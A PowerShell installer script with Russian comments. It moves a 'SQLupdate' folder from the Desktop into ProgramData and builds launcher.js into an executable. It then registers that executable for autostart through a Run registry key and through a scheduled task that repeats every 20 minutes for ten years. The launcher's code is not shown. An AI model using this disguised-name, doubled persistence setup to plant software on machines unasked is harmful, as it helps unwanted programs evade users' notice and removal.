$ErrorActionPreference = 'Stop'

# Обновляем PATH (в PowerShell при запуске скрипта он часто не совпадает с CMD)
$machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
$userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
if ($machinePath -or $userPath) {
    $env:Path = @($machinePath, $userPath) -join ';'
}

function Get-NpxExecutable {
    $cmd = Get-Command npx -ErrorAction SilentlyContinue
    if ($cmd -and $cmd.Source) {
        return $cmd.Source
    }

    $candidates = @(
        "$env:ProgramFiles\nodejs\npx.cmd",
        "${env:ProgramFiles(x86)}\nodejs\npx.cmd",
        "$env:LOCALAPPDATA\Programs\node\npx.cmd"
    )

    foreach ($path in $candidates) {
        if (Test-Path -LiteralPath $path) {
            return $path
        }
    }

    return $null
}

$source = "$env:USERPROFILE\Desktop\SQLupdate"
$destination = "$env:ProgramData"
$dataFolder = "$destination\SQLupdate\data"

if (Test-Path -Path $source) {

    Copy-Item -Path $source -Destination $destination -Recurse -Force
    Remove-Item -Path $source -Recurse -Force

    Write-Host "[*] SUCCESS: Folder moved to $destination\SQLupdate" -ForegroundColor Green

    if (Test-Path -Path "$dataFolder\launcher.js") {

        Write-Host "[*] Starting build for launcher.exe..." -ForegroundColor Yellow

        Set-Location -Path $dataFolder

        $npx = Get-NpxExecutable
        if (-not $npx) {
            Write-Host "[ERROR] npx not found. Install Node.js LTS or run this script from a session where 'npx' works in CMD." -ForegroundColor Red
            exit 1
        }

        $distDir = Join-Path $dataFolder 'dist'
        if (-not (Test-Path -LiteralPath $distDir)) {
            New-Item -ItemType Directory -Path $distDir -Force | Out-Null
        }

        & $npx pkg .\launcher.js --targets node18-win-x64 --output .\dist\launcher.exe
        if ($LASTEXITCODE -ne 0) {
            Write-Host "[ERROR] pkg build failed (exit code $LASTEXITCODE)" -ForegroundColor Red
            exit $LASTEXITCODE
        }

        Write-Host "[*] SUCCESS: Build complete, saved to dist\launcher.exe" -ForegroundColor Green

        # --- Автозагрузка ---
        $exePath = "$dataFolder\dist\launcher.exe"
        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

        Set-ItemProperty `
            -Path $runKey `
            -Name "SQLupdateLauncher" `
            -Value "`"$exePath`"" `
            -Force

        Write-Host "[*] SUCCESS: Added to HKCU Startup Registry" -ForegroundColor Green

        # --- Планировщик ---
        $taskName = "SQLupdateLauncherTask"

        $action = New-ScheduledTaskAction `
            -Execute $exePath

        $trigger = New-ScheduledTaskTrigger `
            -Once `
            -At (Get-Date) `
            -RepetitionInterval (New-TimeSpan -Minutes 20) `
            -RepetitionDuration (New-TimeSpan -Days 3650)

        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries

        Register-ScheduledTask `
            -TaskName $taskName `
            -Trigger $trigger `
            -Action $action `
            -Settings $settings `
            -User "$env:USERDOMAIN\$env:USERNAME" `
            -Force | Out-Null

        Write-Host "[*] SUCCESS: Scheduled task created (runs every 20 minutes)" -ForegroundColor Green

    }
    else {
        Write-Host "[ERROR] launcher.js not found in $dataFolder" -ForegroundColor Red
        exit 1
    }

}
else {
    Write-Host "[ERROR] Source folder $source not found!" -ForegroundColor Red
    exit 1
}
